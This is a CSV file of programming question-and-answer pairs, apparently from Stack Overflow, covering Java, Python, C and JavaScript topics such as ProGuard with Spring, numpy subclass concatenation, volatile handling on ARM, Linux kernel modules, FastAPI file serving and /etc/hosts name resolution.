instruction,input,output,Categories
having difficulties dealing proguard with spring,"I have a web application using spring annotations extensivley and I have my proguard configuration like the following:
-printmapping out.map

-dontoptimize

-keepdirectories

-renamesourcefileattribute SourceFile

-keepattributes Exceptions,SourceFile,LineNumberTable,*Annotation*

-adaptresourcefilenames    **.xsd,**.wsdl,**.xml,**.properties,**.gif,**.jpg,**.png
-adaptresourcefilecontents **.xsd,**.wsdl,**.xml,**.properties,META-INF/MANIFEST.MF 

-dontshrink

-keepclassmembernames class * {
    java.lang.Class class$(java.lang.String); 
    java.lang.Class class$(java.lang.String, boolean);
}

-keepclassmembers enum * {
    public static **[] values(); 
    public static ** valueOf(java.lang.String);
}

-keepclassmembers class * implements java.io.Serializable { 
    static final long serialVersionUID; 
    private static final java.io.ObjectStreamField[] serialPersistentFields; 
    private void writeObject(java.io.ObjectOutputStream); 
    private void readObject(java.io.ObjectInputStream); 
    java.lang.Object writeReplace(); 
    java.lang.Object readResolve();
}

-keep @org.springframework.transaction.annotation.Transactional class *

-keep @org.springframework.stereotype.Service class *

-keep @org.springframework.stereotype.Controller class *

-keep @org.springframework.beans.factory.annotation.Autowired class *

-keep @org.springframework.web.bind.annotation.ResponseBody class *

-keep @org.springframework.web.bind.annotation.RequestMapping class *

-keep @org.springframework.stereotype.Repository class *

-keep @javax.annotation.Resource class *

-keep @javax.persistence.Entity class *

-keep @javax.persistence.Table class *

-keep @javax.persistence.Id class *

-keep @javax.persistence.GeneratedValue class *

-keep @javax.persistence.Column class *

-keep @javax.persistence.Transient class *

-keep @org.springframework.ws.server.endpoint.annotation.Endpoint class *

-keep @org.springframework.ws.server.endpoint.annotation.PayloadRoot class *

-keep @org.springframework.ws.server.endpoint.annotation.ResponsePayload class *

It built fine without warnings whatsoever.
But after deploying in tomcat, and opening the page in the browser it waits and waits without any result, What could be the problem?
","I found out the problem:
proguard can't treat the annotated classes, methods, fields specially when they are runtime types. If you run proguard even with -keep option for the annotations, it will still mess up with the configuration files, because it can only replace classes, methods, fields in the resources that have full reference to the package i.e. if and only if the class/field is mentioned in the following way:     my.package.level.purpose.MyClass/my.package.level.purpose.MyClass.myField.
And coming back to the annotations, a spring web application is full of annotations, so it will be useless or even not obfuscated at all (maybe only the util classes will be obfuscated).
Conlusion:
There is no use of obfuscating modern spring (3.x.x+) web applications with any obfuscators even the commercial ones, because they all work on the byte-code side of the code and will not treat annotations and mess up with the config files.
",java
have numpyconcatenate return proper subclass rather than plain ndarray,"I have a numpy array subclass, and I'd like to be able to concatenate them.
import numpy as np

class BreakfastArray(np.ndarray):
    def __new__(cls, n=1):
        dtypes=[(""waffles"", int), (""eggs"", int)]
        obj = np.zeros(n, dtype=dtypes).view(cls)
        return obj
        
b1 = BreakfastArray(n=1)
b2 = BreakfastArray(n=2)
con_b1b2 = np.concatenate([b1, b2])

print(b1.__class__, con_b1b2.__class__)

this outputs <class '__main__.BreakfastArray'> <class 'numpy.ndarray'>, but I'd like the concatenated array to also be a BreakfastArray class. It looks like I probably need to add a __array_finalize__ method, but I can't figure out the right way to do it.
","Expanding simon's solution,
this is what I settled on so other numpy functions fall-back to standard ndarray (so, numpy.unique(b2[""waffles""]) works as expected). Also a slight change to concatenate so it will work for any subclasses as well.
import numpy as np

HANDLED_FUNCTIONS = {}

class BreakfastArray(np.ndarray):
    def __new__(cls, *args, n=1, **kwargs):
        dtypes=[(""waffles"", int), (""eggs"", int)]
        obj = np.zeros(n, dtype=dtypes).view(cls)
        return obj

    def __array_function__(self, func, types, args, kwargs):
        # If we want ""standard numpy behavior"",
        # convert any BreakfastArray to ndarray views
        if func not in HANDLED_FUNCTIONS:
            new_args = []
            for arg in args:
                if issubclass(arg.__class__, BreakfastArray):
                    new_args.append(arg.view(np.ndarray))
                else:
                    new_args.append(arg)
            return func(*new_args, **kwargs)
        if not all(issubclass(t, BreakfastArray) for t in types):
            return NotImplemented
        return HANDLED_FUNCTIONS[func](*args, **kwargs)

def implements(numpy_function):
    def decorator(func):
        HANDLED_FUNCTIONS[numpy_function] = func
        return func
    return decorator

@implements(np.concatenate)
def concatenate(arrays):
    result = arrays[0].__class__(n=sum(len(a) for a in arrays))
    return np.concatenate([np.asarray(a) for a in arrays], out=result)

",python
arm compiler 5 do not fully respect volatile qualifier,"Consider the following code:   
volatile int status;

status = process_package_header(&pack_header, PACK_INFO_CONST);

if ((((status) == (SUCCESS_CONST)) ? ((random_delay() && ((SUCCESS_CONST) == (status))) ? 0 : side_channel_sttack_detected()) : 1))
{
    ...
}

Which generates this machine code (produced with the toolchain's objdump):
  60:   f7ff fffe       bl      0 <process_package_header>
  64:   9000            str     r0, [sp, #0]     /* <- storing to memory as status is volatile */
  66:   42a0            cmp     r0, r4           /* <- where is the load before compare? status is volatile, it could have change between the last store instruction (above line) and now */
  68:   d164            bne.n   134 <func+0x134>
  6a:   f7ff fffe       bl      0 <random_delay>

Now, since status is volatile, it should have been read from memory when the if statement is reached. I would expect to see some load command before comparing it (cmp) to SUCCESS_CONST, regardless the fact that it was assigned with a return value from function process_package_header() and stored in memory, as status is volatile and could have been changed between str instruction and cmp instruction.
Please try to ignore the motivation for the if condition, it's purpose is to try detecting a physical attack on the CPU in which condition flags and registers can be altered externally by a pysical equipment.
Toolchain ARM DS-5_v5.27.0 arm compiler: ARMCompiler5.06u5 (armcc)
Target is ARM CortexM0+ CPU
","The main rule governing volatile objects is this, from C11 6.7.3/7:

any expression referring to such an object shall be evaluated strictly
  according to the rules of the abstract machine, as described in
  5.1.2.3. Furthermore, at every sequence point the value last stored in the object shall agree with that prescribed by the abstract machine,
  except as modified by the unknown factors mentioned previously.

And it goes on to say that

What constitutes an access to an object that has volatile-qualified
  type is implementation-defined.

, which applies to how other rules (e.g. in 5.1.2.3) are to be interpreted.  Your compiler's Users' Guide discusses the details of volatile accesses, but there doesn't seem to be anything surprising there.  Section 5.1.2.3 itself mainly talks about sequencing rules; the rules for evaluating expressions are elsewhere (but must still be followed as given with regard to accesses to your volatile object).
Here are the relevant details of the behavior of the abstract machine:

the assignment operation has a side effect of storing a value in the object identified by status.  There is a sequence point at the end of that statement, so

the side effect is applied before any evaluations appearing in subsequent statements are performed, and
because status is volatile, the assignment expressed by that line is the last write to status performed by the program before the sequence point.

the conditional expression in the if statement is evaluated next, with

the sub-expression (status) == (SUCCESS_CONST) being evaluated first, before any of the other sub-expressions.
Evaluation of status happens before evaluation of the == operation, and
takes the form of converting that identifier to the value stored in the object it identifies (lvalue conversion, per paragraph 6.3.2.1/2).
In order to do anything with the value stored in status at that time, that value must first be read.  


The standard does not require a volatile object to reside in addressable storage, so in principle, your volatile automatic variable could be assigned exclusively to a register.  In that event, as long as machine instructions using that object either read its value directly from its register or make updates directly to its register, no separate loads or stores would be required to achieve proper volatile semantics.  Your particular object does not appear to fall into this category, however, because the store instruction in your generated assembly seems to indicate that it is, indeed, associated with a location in memory.
Moreover, if the program correctly implemented volatile semantics for an object assigned to a register, then that register would have to be r0.  I'm not familiar with the specifics of this assembly language and the processor on which the code runs, but it certainly does not look like r0 is a viable locus for such storage.
With that being the case I agree that status should have been read back from memory, and it should be read back from memory again if its second appearance in the conditional expression needs to be evaluated.  This is the behavior of the abstract machine, which conforming implementations exhibit with respect to all volatile accesses.  My analysis, then, is that your implementation is non-conforming in this regard, and I would be inclined to report that as a bug.
As for a workaround, I think your best bet as to write the important bits in assembly -- inline assembly if your implementation supports that, or as a complete function implemented in assembly if necessary.
",c
is the atoi function really efficient to compare an integer and a string,"I'm currently trying to make a function containing an ""if"" sequence.The condition of this if is linked to command line arguments as my function should only if the third command line argument passed is the number '0'. My current problem is that the atoi() function return 0 in case of failure making my function works even when the third arguments is a letter or a random character.That's why i'm wondering if the problem is the atoi() function or my lack of comprehension about command line arguments.
Here is an example of my code:
int encryption_case(int ac, char **av)
{
    if(atoi(av[3]) == 0){
         print_matrix(av[2]);
    } else {
    exit (84);
    }
}

I also tried working without the atoi function but the comparison between av and a number is tricky for me.I would greatly appreciate even if not the direct answer to be redirect to a website to solidify my basics in c.
","Using atoi to test whether a string is “0” is inefficient.
Whether a C string is “0” is determined by:

The first byte is '0'.
The second byte is zero.

This is fundamentally a test of two bytes or, if the platform permits, a test of 16 bits, and so it should be an operation that is at most loading a byte, comparing it, branching based on the result, loading a second byte, comparing it, and branching based on the result. In contrast, atoi involves a function call, establishing a stack frame, possibly initializing local data in preparation for numerical conversion work, loading the first byte, checking whether it is a white space character, then checking whether it is  “-” or a digit, and so on, followed by popping the stack frame and returning. It is almost certainly more work than the simple string comparison required.

… the comparison between av and a number is tricky for me.

We can perform the test described above this way:
const char *p = av[3];           // Save av[3] in a pointer for convenience.
if (p[0] == '0' && p[1] == '\0') // Test for “0” digit followed by null character.
    print_matrix(av[2]);
…

We could also use the strcmp function in the standard C library:
#include <string.h>

…

if (0 == strcmp(av[3], ""0""))
    print_matrix(av[2]);
…

That nominally involves a function call and so may be less efficient than the manual test. However, with -O3, both Clang and GCC compile it to a direct test of the two bytes, at least for some target platforms.
",c
how to make a large file accessible to external apis,"I'm new to webdev, and I have this use case where a user sends a large file (e.g., a video file) to the API, and then this file needs to be accessible to other APIs (which could possibly be on different servers) for further processing.
I'm using FastAPI for the backend, defining a file parameter with a type of UploadFile to receive and store the files. But what would be the best way to make this file accessible to other APIs? Is there a way I can get a publicly accessible URL out of the saved file, which other APIs can use to download the file?
","Returning a File Response
First, to return a file that is saved on disk from a FastAPI backend, you could use FileResponse (in case the file was already fully loaded into memory, see here). For example:
from fastapi import FastAPI
from fastapi.responses import FileResponse

some_file_path = ""large-video-file.mp4""
app = FastAPI()

@app.get(""/"")
def main():
    return FileResponse(some_file_path)

In case the file is too large to fit into memory—as you may not have enough memory to handle the file data, e.g., if you have 16GB of RAM, you can't load a 100GB file—you could also use StreamingResponse instead. That way, you don't have to read the entire contents into memory at once, but, instead, read them in chunks, thus processing the data one chunk at a time. It should be noted, though, that FileResponse, as shown in the FileResponse class implementation, reads the file contents into memory in chunks as well; hence, there would be no memory issues with using FileResponse either. However, as can be seen in the implementation, FileResponse uses a pre-defined chunk size of 64KB. Thus, if you wished choosing a larger chunk size, you could instead use StreamingResponse and specify the chunk size as desired, as demonstrated in this answer, or use yield from f, as shown below (but, this might be somewhat slower, always depending on your needs).
from fastapi import FastAPI
from fastapi.responses import StreamingResponse

some_file_path = ""large-video-file.mp4""
app = FastAPI()

@app.get(""/"")
def main():
    def iterfile():
        with open(some_file_path, mode=""rb"") as f:
            yield from f

    return StreamingResponse(iterfile(), media_type=""video/mp4"")

Exposing the API to the public
As for exposing your API to the public—i.e., external APIs, users, developers, etc.—you can use ngrok (or expose, as suggested in this answer).
Ngrok is a cross-platform application that enables developers to expose a local development server to the Internet with minimal effort. To embed the ngrok agent into your FastAPI application, you could use pyngrok—as suggested here (see here for a FastAPI integration example). If you would like to run and expose your FastAPI app through Google Colab (using ngrok), instead of your local machine, please have a look at this answer (plenty of tutorials/examples can also be found on the web).
If you are looking for a more permanent solution, you may want to have a look at cloud platforms—more specifically, a Platform as a Service (PaaS). I would strongly recommend you thoroughly read FastAPI's Deployment documentation. Have a closer look at About HTTPS and Deployments Concepts.
Important Notes
By exposing your API to the outside world, you are also exposing it to various forms of attack. Before exposing your API to the public—even if it’s for free—you need to make sure you are offering secure access (use HTTPS), as well as authentication (verify the identity of a user) and authorization (verify their access rights; in other words, verify what specific routes, files and data a user has access to)—take a look at 1. OAuth2 and JWT tokens, 2. OAuth2 scopes, 3. Role-Based Access Control (RBAC), 4. Get Current User and How to Implement Role based Access Control With FastAPI.
Addtionally,  if you are exposing your API to be used publicly, you may want to limit the usage of the API because of expensive computation, limited resources, DDoS attacks, Brute-force attacks, Web scraping, or simply due to monthly cost for a fixed amount of requests. You can do that at the application level using, for instance, slowapi (related post could be found  here), or at the platform level by setting the rate limit through your hosting service (if permitted). Furthermore, you would need to make sure that the files uploaded by users have the permitted file extension, e.g., .mp4, and are not files with, for instance, a .exe extension that are potentially harmful to your system. Also, you should rather give your own filenames and keep track of them (associate them with user accounts), when saving the user's uploaded files to disk, by generating unique random UUIDs, for instance. In this way, you would avoid filename clashes, as well as ensure that unauthorized users could not have access to whatever file(name) they may request—it might also be a good idea to create a different disk space/directory for each user, where their files will be stored and separate from others.
Finally, you would also need to ensure that the uploaded files do not exceed a predefined MAX_FILE_SIZE limit (based on your needs and system's resources), so that authenticated users, or an attacker, would be prevented from uploading extremely large files that would result in consuming server resources in a way that the application may end up crashing. You shouldn't rely, though, on the Content-Length header being present in the request to do that, as this might be easily altered, or even removed, by the client. You should rather use an approach similar to this answer (have a look at the ""Update"" section) that uses request.stream() to process the incoming data in chunks as they arrive, instead of loading the entire file into memory first. By using a simple counter, e.g., total_len += len(chunk), you can check if the file size has exceeded the MAX_FILE_SIZE, and if so, raise an HTTPException with HTTP_413_REQUEST_ENTITY_TOO_LARGE status code (see this answer as well, for more details and code examples).
Read more on FastAPI's Security documentation and API Security on Cloudflare.
",python
save file directly to specified path without showing save or open dialogue,"I'm invoking javascript in a web page using
webBrowser2.Document.InvokeScript(""download_file"");`. 

This javascript opens dialogue asking user to save or open the file. I want to save the file directly to the path without showing the dialogue to user. How can i achieve this. I'm scraping the web page. I'm extracting the required details from the web page.
download_file():
function download_file() {
    var summaryFlag = 0;
    if (document.getElementById(""frmincludefilesummary"").checked) {
        summaryFlag = 1;
    }
    url = '/filedatabase/file_process_request.html?mru=53616c7&type=doc';
    url += '&sum=' + summaryFlag + '&logo=0&xcode=name&serve_txt=0&folderid=';
    document.location = url;
}​

","The thing you are trying to achieve is not possible. Javascript cannot access or write to the client filesystem directly. If allowed it would be a huge security breach.
Alternate options would be to make use of flash or java or activeX.
",javascript
my linux kernel module to control fan speeds and rgb keyboard of acer nitro 16 causes kernel panic,"I'm writing a kernel module for controlling the fans and RGB keyboard of Acer Nitro 16. The code, works very well but I have a problem: after some time I insert the module with insmod, my computer freezes (I'm sure about it's kernel panic, because of often the caps lock light starts to blink). When I check the dmesg log, it says General protection fault, after a bit of research, I saw people was said it can be caused by faulty memory module on arch forums, but I'm sure about my memory modules are clean, without the kernel module there is no problem.
My Code:
#include ""acer_nitro_gaming_driver2.h""
#include ""linux/fs.h""
#include ""linux/init.h""
#include ""linux/kdev_t.h""
#include ""linux/kern_levels.h""
#include ""linux/kstrtox.h""
#include ""linux/printk.h""
#include ""linux/wmi.h""

MODULE_LICENSE(""GPL"");
static int cmajor= 0;

static struct class *cclass=NULL;
dev_t cdev;
static const struct file_operations cfops={
    .owner=THIS_MODULE,
    .write= cdev_user_write,
    .open= chdev_open,
    .release= chdev_release

};
struct chdev_data{
    struct cdev cdev;
};
static struct chdev_data cdev_data[2];
extern int chdev_uevent(const struct device *dev,struct kobj_uevent_env *env){
    add_uevent_var(env, ""DEVMODE=%#o"",0666);
    return 0;
}

void cdev_create(char * name, int major, int minor,  struct class *class){
    cdev_init(&cdev_data[minor].cdev,&cfops);
    cdev_data[minor].cdev.owner = THIS_MODULE;
    cdev_add(&cdev_data[minor].cdev,MKDEV(major,minor),1);
    device_create(class,NULL,MKDEV(major,minor),NULL,name);
}
ssize_t cdev_user_write(struct file * file,const char __user * buff, size_t count, loff_t *offset){
    int cdev_minor = MINOR(file->f_path.dentry->d_inode->i_rdev);
    printk(KERN_INFO""writing to : %d"",cdev_minor);
    char * kbfr=kmalloc(count,GFP_KERNEL);
    kbfr[strlen(kbfr)-1]='\0';
    int ispeed =0;
    copy_from_user(kbfr,buff,count);
    if(kbfr==NULL)
        return -ENOMEM;
    printk(KERN_INFO""%s"",kbfr);
    switch(cdev_minor){
        case 0:
            printk(KERN_INFO""CPUFAN"");
            kstrtoint(kbfr,10 ,&ispeed );
            fan_set_speed(ispeed,1 );
            break;
        case 1:
            printk(KERN_INFO""GPUFAN"");
            kstrtoint(kbfr,10 ,&ispeed );
            fan_set_speed(ispeed,4 );
            break;
    }
    return count;
}
extern int chdev_open(struct inode * inode,struct file * file){
    try_module_get(THIS_MODULE);
    return 0;
}

extern int chdev_release(struct inode * inode,struct file * file){
    module_put(THIS_MODULE);
    return 0;
}
//Wmi Driver Definition
static struct wmi_device *w_dev ;

struct driver_data_t{};

static const struct wmi_device_id w_dev_id[] = {{
    .guid_string = WMI_GAMING_GUID
},
};

static struct wmi_driver wdrv = {
    .driver = {.owner = THIS_MODULE, .name = DRV_NAME, .probe_type=PROBE_PREFER_ASYNCHRONOUS},
    .id_table = w_dev_id,
    .remove = wmi_remove,
    .probe = wmi_probe,

};
void wmi_remove(struct wmi_device *w_devv) { w_dev = NULL; }

extern int wmi_probe(struct wmi_device *wdevv, const void *notuseful) {
    struct driver_data_t *driver_data;
    if(!wmi_has_guid(WMI_GAMING_GUID))
        return -ENOMEM;
    driver_data =
        devm_kzalloc(&wdevv->dev, sizeof(struct driver_data_t), GFP_KERNEL);
    dev_set_drvdata(&wdevv->dev,driver_data );
    w_dev = wdevv;
    //Unlock the fan speeds
    wmi_eval_int_method(14,7681 );
    wmi_eval_int_method(14,1638410 );
    //Set fan speeds to 512
    wmi_eval_int_method(16,5121 );
    wmi_eval_int_method(16,5124 );
    dy_kbbacklight_set(1, 5, 100, 1, 255, 0, 0);
    return 0;
}
//Wmi Functions
extern void __wmi_eval_method(struct wmi_device * wdev,int methodid ,int instance ,struct acpi_buffer *inbuffer){
    struct acpi_buffer out = {ACPI_ALLOCATE_BUFFER, NULL};
    wmidev_evaluate_method(wdev,instance ,methodid ,inbuffer ,&out );
}
extern void wmi_eval_method(int methodid,struct acpi_buffer inputacpi){
    __wmi_eval_method(w_dev,methodid ,0 ,&inputacpi );
}
extern void wmi_eval_int_method(int methodid,int input){
    struct acpi_buffer in = {(acpi_size)sizeof(input),&input};
    wmi_eval_method(methodid,in );
}
//Concatenate Function*
//Thanks to: https://stackoverflow.com/questions/12700497/how-to-concatenate-two-integers-in-c

unsigned concatenate(unsigned x, unsigned y) {
    unsigned pow = 10;
    while(y >= pow)
        pow *= 10;
    return x * pow + y;
}
//Set Fan Speeds

extern int fan_set_speed(int speed ,int fan ){
    int merged=  concatenate(speed,fan);
    printk(KERN_INFO""%d"",merged);
    wmi_eval_int_method(16,merged );
    return 0;
}
//Keyboard RGB Led
extern void dy_kbbacklight_set(int mode, int speed, int brg, int drc, int red, int green, int blue){
    u8 dynarray [16] = {mode, speed, brg, 0, drc, red, green, blue, 0, 1, 0, 0, 0, 0, 0, 0};
    struct acpi_buffer in  = {(acpi_size)sizeof(dynarray),dynarray};
    wmi_eval_method(20,in);
}
int module_startup(void){
    if(!wmi_has_guid(WMI_GAMING_GUID))
        return -ENODEV;
    if(alloc_chrdev_region(&cdev,0 ,2 ,""acernitrogaming"" )<0)
        return -ENXIO;
    cmajor = MAJOR(cdev);
    cclass = class_create(""acernitrogaming"");
    cclass->dev_uevent=chdev_uevent;
    cdev_create(""fan1"",cmajor ,0,cclass );
    cdev_create(""fan2"",cmajor ,1,cclass );
    wmi_driver_register(&wdrv);

    printk(""Acer Nitro Gaming Functions Wmi Driver Module was loaded"");
    return 0;
}
void module_finish(void){
    printk(""Acer Nitro Gaming Functions Wmi Driver Module was unloaded"");
    device_destroy(cclass, MKDEV(cmajor,0));
    device_destroy(cclass, MKDEV(cmajor,1));
    class_destroy(cclass);
    unregister_chrdev_region(MKDEV(cmajor,0 ),MINORMASK );
    wmi_driver_unregister(&wdrv);

}

module_init(module_startup);
module_exit(module_finish);

Logs:
Oops: general protection fault, probably for non-canonical address 0x1cff96aa80deee40: 0000 [#1] PREEMPT SMP NOPTI

CPU: 10 UID: 1000 PID: 2070 Comm: Xwayland Tainted: POE 6.12.9-zen1-1-zen #1 3932de41e0e2f413f8ccd21a06
c6e6c1ba8fb994

RIP: 0010:__kmalloc_noprof+0x10b/0x3f0

Code: 73 e6 99 59 48 8b 50 08 48 83 78 10 00 48 8b 38 0f 84 47 02 00 00 48 85 ff 0f 84 3e 02 00 00 41 8b 45 28 49 8b 7500 48 01 f8 <48> 8b 18 48 89 c1 49 33 9d b8 00 00 00 48 89 f8 48 0f c9 48 31 cb

","The lines
char * kbfr=kmalloc(count,GFP_KERNEL);
kbfr[strlen(kbfr)-1]='\0';
int ispeed =0;
copy_from_user(kbfr,buff,count);
if(kbfr==NULL)
    return -ENOMEM;

Should be changed to:
#include <fortify-string.h>

char * kbfr=kmalloc(count,GFP_KERNEL);
int ispeed =0;
if(kbfr==NULL)       // Check before copy
    return -ENOMEM;
copy_from_user(kbfr,buff,count);
int ix = strnlen(kbfr, count);
if (ix > 0)          // check for 0
    kbfr[ix-1] = '\0';   // always terminate

",c
eclipse shows errors but i can39t find them,"I am trying to run my project, but Eclipse is saying I have errors. But there are no errors, just a red cross where the project name is. I have tried deleting the R.java and generating a new one, but that didn't work.
","Based on the error you showed ('footballforum' is missing required Java project: 'ApiDemos'), I would check your build path.  Right-click the footballforum project and choose Build Path > Configure Build Path.  Make sure ApiDemos is on the projects tab of the build path options. 
",java
how to stop adblocks from blocking my revive adserver banner promotions,"I am using revive adserver to show my users promotions banners and track conversion. The problem is that adblock completely blocks my banners. I would like to change my banner code so that my users who are using adblock still will be able to know about promotions. 
","This is very complicated because new filters are being written and available every day. However, removing any code or markup and signifies that your ad is an ad can help.
Ie. Remove word like: ad, popup, banner, giveaway, etc.
Further, the best way is to determine what filter is blocking your ad, then alter the ad so that it isn't matched. Although if the site serving the ad has a lot of traffic a new filter will be written very quickly, and then at that point it's just a you against the world. So it's sort of pointless to even try.
An ad is an ad and will eventually be blocked.
",javascript
using standard c library function on arm64 macos assembly doesn39t work after linking,"I'm on MacOS (Apple Silicon M4 processor, so, ARM64), and when trying to use puts from the standard C library:
    .global main                                                        // 1 
main:                                                                   // 2 
    stp     x21, x30, [sp, -16]!    // push onto stack                  // 3 
    mov     x21, x1                 // argc -> x0, argv -> x1           // 4 
                                                                        // 5 
top:                                                                    // 6 
    ldr     x0, [x21], 8            // argv++, old value in x0          // 7 
    cbz     x0, bottom              // if *argv == NULL goto bottom     // 8 
    bl      puts                    // puts(*argv)                      // 9 
    b       top                     // goto top                         // 10 
                                                                        // 11 
bottom:                                                                 // 12 
    ldp     x21, x30, [sp], 16      // pop from stack                   // 13 
    mov     x0, xzr                 // return 0                         // 14 
    ret                                                                 // 15 
                                                                        // 16 
    .end                       

It fails, and returns:
~/ clang -lc -arch arm64 test2.s -e main                                                                                               

Undefined symbols for architecture arm64:
  ""puts"", referenced from:
      main in test2-8965bb.o
ld: symbol(s) not found for architecture arm64
clang: error: linker command failed with exit code 1 (use -v to see invocation)


I have tried with the addition of the -lSystem flag, doesn't work, instead just returns a ld: warning: ignoring duplicate libraries: '-lSystem' warning.
Not sure what I did wrong, making it that I can't use libc (just in case, I have tried this:
#include <stdio.h>

int main(){
  puts(""Hello, World!"");
  return 0;
}

Whos assembly equivalent is:
    .section    __TEXT,__text,regular,pure_instructions
    .build_version macos, 15, 0 sdk_version 15, 2
    .globl  _main                           ; -- Begin function main
    .p2align    2
_main:                                  ; @main
    .cfi_startproc
; %bb.0:
    sub sp, sp, #32
    stp x29, x30, [sp, #16]             ; 16-byte Folded Spill
    add x29, sp, #16
    .cfi_def_cfa w29, 16
    .cfi_offset w30, -8
    .cfi_offset w29, -16
    mov w8, #0                          ; =0x0
    str w8, [sp, #8]                    ; 4-byte Folded Spill
    stur    wzr, [x29, #-4]
    adrp    x0, l_.str@PAGE
    add x0, x0, l_.str@PAGEOFF
    bl  _puts
    ldr w0, [sp, #8]                    ; 4-byte Folded Reload
    ldp x29, x30, [sp, #16]             ; 16-byte Folded Reload
    add sp, sp, #32
    ret
    .cfi_endproc
                                        ; -- End function
    .section    __TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
    .asciz  ""Hello, World!""

.subsections_via_symbols

Which works just fine!)
Some help would be appreciated!
","As @Shawn and @fuz mentioned, adding a prefixing _ is required for all C code built for the macOS ABI.
Therefore, the corrected code would become:
    .global main                                                        // 1 
main:                                                                   // 2 
    stp     x21, x30, [sp, -16]!    // push onto stack                  // 3 
    mov     x21, x1                 // argc -> x0, argv -> x1           // 4 
                                                                        // 5 
top:                                                                    // 6 
    ldr     x0, [x21], 8            // argv++, old value in x0          // 7 
    cbz     x0, bottom              // if *argv == NULL goto bottom     // 8 
    bl      _puts                   // note that there is a `_`         // 9   
    b       top                     // goto top                         // 10 
                                                                        // 11 
bottom:                                                                 // 12 
    ldp     x21, x30, [sp], 16      // pop from stack                   // 13 
    mov     x0, xzr                 // return 0                         // 14 
    ret                                                                 // 15 
                                                                        // 16 
    .end         

Fixed part:
bl    _puts  // with the addition of the leading `_` 

",c
typedef did not replaced with the datatype,"I was surprised with the following piece of code,
#include<stdio.h>
typedef int type;

int main( )
{
    type type = 10;
    printf( ""%d"", type );
}

This went through and output of the program is 10.
But when I changed the code slightly as below,
#include<stdio.h>
typedef int type;

int main()
{
    type type = 10;
    float f = 10.9898;
    int x;
    x = (type) f;
    printf( ""%d, %d"", type, x);
}

in aCC compiler:

""'type' is used as a type, but has not been defined as a type."" 

in g++ compiler:

""error: expected `;' before f""

Is it that the compiler did not recognize the pattern in the second case, as this pattern can be related to assignment of a variable, evaluation of an expression etc and in the first case as this pattern is only used while defining a variable compiler recognized it.
","typedef identifiers, like variable names, also has a scope. After
type type = 10;

the variable type shadows the type name type. For instance, this code
typedef int type;
int main( )
{
    type type = 10;
    type n;   //compile error, type is not a type name
}

won't compile for the same reason, in C++, you can use ::type to refer to the type name:
typedef int type;
int main( )
{
    type type = 10;
    ::type n;  //compile fine
}

",c
add a timeout for getchar,"I need to add a timeout function for getchar() in my program. 
What do I do so that when my program reaches the instruction getchar(), it will only wait for a certain amount of time for the user to make a keystroke and if the user does not make a keystroke within the given time limit, the program will ""skip"" the getchar()?
The operating system does not support the conio.h library so kbhit is not an option.
","This is usually achieved by using select() on stdin. Another solution would be using alarm() and a dummy SIGALRM handler to interrupt the getchar() call (only working on POSIX systems though).
",c
resolve hostnames using etchosts only,"I'm trying to resolve a hostname to an IP address using the /etc/hosts file only.
That is, if the name cannot be locally resolved, it must fail (ie. no DNS request sent out).
The standard way to resolve a name is with getaddrinfo, but this will fallback to DNS.
gethostent_r seems a good candidate since it returns records from the local hosts file, but unfortunately, I do not get IPv6 records, only IPv4.
How can I resolve a name to an IPv4 or IPv6 address based on the local /etc/hosts file only ?
","
gethostent_r seems a good candidate since it returns records from the local hosts file, but unfortunately, I do not get IPv6 records, only IPv4.

That doesn't sound right to me. It should return both types, assuming they are actually in /etc/hosts – but it will likely return them as two separate entries, as it goes through the file line-by-line.
Other methods:
If you are using glibc, you might be able to call __nss_configure_lookup(""hosts"", ""files"") – an internal glibc function which the getent tool uses to implement its -s option (as in {""getent"", ""-s"", ""hosts"", arg}).
A slightly better method, also for glibc, is to directly dlopen() the corresponding libnss ""backend"" module that is responsible for providing hostname lookup from /etc/hosts; that is, libnss_files.so.2. The interface between glibc and the libnss modules is a bit messy (especially the several different ""hostname"" functions), but it is stable.
Either of those might be preferable to writing your own parser, although not due to CPU usage – rather, due to the high chance that your custom parser will be incomplete and won't match the way glibc itself parses /etc/hosts. Make sure to test your parser with multiple address mappings for the same name; multiple names for the same address; mixed IPv4 and IPv6 mappings for the same name; etc. Otherwise users/sysadmins may be very annoyed.

it takes more CPU time for something the system has already done

The system hasn't really ""already done"" it. On most Linux systems there is no central cache for /etc/hosts; it is parsed independently by each process. (Some systems might have the 'nscd' general-purpose name-lookup cache daemon running but it's uncommon.) So if you do gethostbyname() and let libc read /etc/hosts, that's really the same as parsing it yourself.
",c
